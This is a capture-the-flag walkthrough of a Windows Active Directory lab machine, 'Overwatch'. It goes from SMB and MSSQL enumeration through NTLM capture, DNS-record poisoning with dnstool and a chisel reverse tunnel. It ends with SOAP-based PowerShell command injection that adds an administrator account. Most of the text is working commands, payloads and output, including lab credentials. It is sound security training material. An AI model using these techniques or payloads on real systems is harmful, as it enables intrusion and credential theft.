➜  Overwatch nmap -T4 10.129.244.81 -A -p-
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-21 07:40 +0400
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.02% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.04% done
Nmap scan report for 10.129.244.81
Host is up (0.15s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-21 03:43:18Z)
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn?
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-10-21T03:43:32+00:00
|_ssl-date: 2026-10-21T03:44:55+00:00; -18s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2026-10-20T03:28:12
|_Not valid after:  2027-04-21T03:28:12
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6520/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  unknown
49668/tcp open  unknown
56262/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56263/tcp open  unknown
56270/tcp open  unknown
56357/tcp open  unknown



I saw there is unusual 6520 port, so i enumerated it deeper deparately.

➜  Overwatch nmap -p 6520 10.129.244.81 -sC -sV
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-21 07:37 +0400
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.99% done; ETC: 07:37 (0:00:00 remaining)
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.99% done; ETC: 07:37 (0:00:00 remaining)
Nmap scan report for 10.129.244.81
Host is up (0.16s latency).

PORT     STATE SERVICE  VERSION
6520/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.244.81:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.244.81:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
|_ssl-date: 2026-10-21T03:37:39+00:00; -18s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-10-21T03:30:28
|_Not valid after:  2056-10-21T03:30:28


I saw that it is MSSQL service. Maybe I can find credentials to connect it. Let's look at the smb shares.

➜  Overwatch netexec smb 10.129.244.81  -u "guest" -p "" --shares
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest: 
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share 


I connected to "software$" folder

➜  Overwatch smbclient //10.129.244.81/software$ -N    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DH        0  Sat May 17 05:27:07 2025
  ..                                DHS        0  Thu Jan  1 10:46:47 2026
  Monitoring                         DH        0  Sat May 17 05:32:43 2025

		7147007 blocks of size 4096. 1162596 blocks available
smb: \> recurse on
smb: \> ls
  .                                  DH        0  Sat May 17 05:27:07 2025
  ..                                DHS        0  Thu Jan  1 10:46:47 2026
  Monitoring                         DH        0  Sat May 17 05:32:43 2025

\Monitoring
  .                                  DH        0  Sat May 17 05:32:43 2025
  ..                                 DH        0  Sat May 17 05:27:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 00:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 00:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 00:38:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 00:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 18:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 05:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 05:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 05:19:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 00:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 00:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 00:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 22:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 18:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 18:46:10 2017
  x64                                DH        0  Sat May 17 05:32:33 2025
  x86                                DH        0  Sat May 17 05:32:33 2025

\Monitoring\x64
  .                                  DH        0  Sat May 17 05:32:33 2025
  ..                                 DH        0  Sat May 17 05:32:43 2025
  SQLite.Interop.dll                 AH  2005688  Sat Sep 28 23:18:20 2024

\Monitoring\x86
  .                                  DH        0  Sat May 17 05:32:33 2025
  ..                                 DH        0  Sat May 17 05:32:43 2025
  SQLite.Interop.dll                 AH  1592504  Sat Sep 28 23:17:44 2024


the overwatch.exe.config didnt expose any confidential information. I decided to read the binary data of overwatch.exe via ILspy.

![alt text](image.png)
--> Overwatch --> Metadata --> UserString Heap
I saw a line in there: 00000224	78	Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;

They are our MSSQL credentials.

impacket-mssqlclient -p 6520 sqlsvc@10.129.244.81 -windows-auth

I enumerated the databases and tables but didn't get any sensitive data. I decided to get the hash of service account via responder.

In my kali:
sudo responder -I tun0

In MSSQL:
EXEC master..xp_dirtree '\\10.10.14.25\share\';

At that moment we will get the NTLMv2 hash of service user on responder terminal.

[SMB] NTLMv2-SSP Client   : 10.129.244.81
[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$
[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:1f9bdadf0cb65d29:72FB7E9FA8F2FB25596E865E511ECB46:0101000000000000806E076F3261DD01C6BE2A5D13B58B6900000000020008004D0036004400340001001E00570049004E002D00320059004200460048004C0038004300460059004C0004003400570049004E002D00320059004200460048004C0038004300460059004C002E004D003600440034002E004C004F00430041004C00030014004D003600440034002E004C004F00430041004C00050014004D003600440034002E004C004F00430041004C0007000800806E076F3261DD0106000400020000000800300030000000000000000000000000300000E3FCF7ACD15A4498C83CA452D22F69B8211DF22E55C9A57AEF609E44BB5CF8E50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000

But it couldn't be crackable by hashcat. Because it is 128-symbols and hard to crack. We need to find a way to get plain password of that user. I decided to enumerate linked servers.

SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL    

Then I decided to connect it.

SQL (OVERWATCH\sqlsvc  dbo@overwatch)> use_link SQL07
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [53]. 
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> use_link SQL07
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.


The erro shows us:
The server no longer exists.
DNS resolution is broken.
The hostname was mistyped.

However, the important detail is that MSSQL is still attempting to establish a connection to SQL07 . In Active
Directory environments, authenticated users are often allowed to create DNS records by default. Since we
already possess valid domain credentials for sqlsvc , we can abuse this behaviour to create a malicious
DNS record for SQL07.overwatch.htb pointing to our attacker machine. As a result, when MSSQL attempts
to connect to the linked server, the connection is redirected to us, forcing the SQL Server service account to
authenticate to our machine and allowing us to capture its credentials.

We can use dnstool from the krbrelayx toolkit to create the DNS entry

➜  Tools git clone https://github.com/dirkjanm/krbrelayx.git
Cloning into 'krbrelayx'...
remote: Enumerating objects: 270, done.
remote: Counting objects: 100% (131/131), done.
remote: Compressing objects: 100% (57/57), done.
remote: Total 270 (delta 104), reused 74 (delta 74), pack-reused 139 (from 2)
Receiving objects: 100% (270/270), 114.20 KiB | 713.00 KiB/s, done.
Resolving deltas: 100% (151/151), done.
➜  Tools cd krbrelayx
➜  krbrelayx git:(master) python3 dnstool.py -u 'overwatch\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07.overwatch.htb -a add -t A -d 10.10.14.25 10.129.244.81
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully


Then, open responder in kali:
sudo responder -I tun0 -v

Execute this on MSSQL:
use_link SQL07

We got credentials of that user:
[+] Listening for events...

[MSSQL] Received connection from 10.129.244.81
[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx


➜  krbrelayx git:(master) evil-winrm -i 10.129.244.81 -u sqlmgmt -p bIhBbzMMnB82yx
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> dir


    Directory: C:\Users\sqlmgmt\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/20/2026   8:29 PM             34 user.txt


*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
e0d693cbc7acfd330629904df08fd118
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> 


I need to escalate my privileges now. I remembered that there was a service that is shown on the output of the "overwatch.exe.config" file. 

<add baseAddress="http://overwatch.htb:8000/MonitorService" />

I should pivot with chisel and forward this IP to my localhost.

In kali:
./chisel server -p 9090 --reverse

In target:
.\chisel.exe client 10.10.14.25:9090 R:8001:127.0.0.1:8000


I forwarded port 8000 of target to my local 8001 port. In this way, when i want to access "http://overwatch.htb:8000/MonitorService" I will open this url "http://localhost:8001/MonitorService"

On the web site, I saw these things:

MonitoringService Service

You have created a service.

To test this service, you will need to create a client and use it to call the service. You can do this using the svcutil.exe tool from the command line with the following syntax:

svcutil.exe http://overwatch.htb:8000/MonitorService?wsdl

You can also access the service description as a single file:

http://overwatch.htb:8000/MonitorService?singleWsdl

This will generate a configuration file and a code file that contains the client class. Add the two files to your client application and use the generated client class to call the Service.


SOAP (Simple Object Access Protocol) is a protocol that allows applications to communicate by exchanging
XML -based requests and responses over HTTP . Unlike REST APIs, SOAP services usually expose a WSDL
(Web Services Description Language) document that describes the available methods, parameters, and
request structure.
Accessing the /MonitorService?singleWsdl endpoint confirms this behaviour and reveals the available
service operations.


The WSDL document exposes the following methods:
StartMonitoring
StopMonitoring
KillProcess

At this point, we can load the application into dotPeek to inspect the underlying source code and
understand how these methods are implemented.
The KillProcess() method seems interesting.

public string KillProcess(string processName)
{
string scriptContents = $"Stop-Process -Name {processName} -Force";
try
{
using (Runspace runspace = RunspaceFactory.CreateRunspace())
{
runspace.Open();
using (Pipeline pipeline = runspace.CreatePipeline())
{
pipeline.Commands.AddScript(scriptContents);
The vulnerability becomes obvious once we inspect how the PowerShell command is constructed. The
application directly inserts user-controlled input into a PowerShell command.
No sanitization or escaping is performed. This means we can inject additional PowerShell commands using
separators such as ; . For example:
The service executes commands using PowerShell runspaces. This is important because our injected
commands will execute with the same privileges as the service itself. Since the service is running as SYSTEM ,
successful command injection gives us SYSTEM-level command execution.
Unlike normal REST APIs, SOAP services expect specially formatted XML requests. To interact with the
vulnerable KillProcess() method, we must send a SOAP request containing our malicious input.


We can look up template SOAP messages and craft a payload that:
1. Creates a new user
2. Adds the user to the local Administrators group


$payload = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> <s:Body><KillProcess xmlns="http://tempuri.org/"><processName>dummy; net user pwnadmin Pass@123! /add; net localgroup administrators pwnadmin /add #</processName> </KillProcess></s:Body></s:Envelope>'

Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" -Method POST -ContentType "text/xml; charset=utf-8" -Headers @{SOAPAction = "http://tempuri.org/IMonitoringService/KillProcess"} -Body $payload -UseBasicParsing


*Evil-WinRM* PS C:\temp> net user pwnadmin
User name                    pwnadmin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/20/2026 10:29:56 PM
Password expires             12/1/2026 10:29:56 PM
Password changeable          10/21/2026 10:29:56 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.


➜  Overwatch evil-winrm -i 10.129.244.81 -u pwnadmin -p Pass@123!
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\pwnadmin\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\pwnadmin\Desktop> ls
*Evil-WinRM* PS C:\Users\pwnadmin\Desktop> dir -force
*Evil-WinRM* PS C:\Users\pwnadmin\Desktop> cd ..\..\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
bba75534b9b60c48b36e6ee1fd307f40

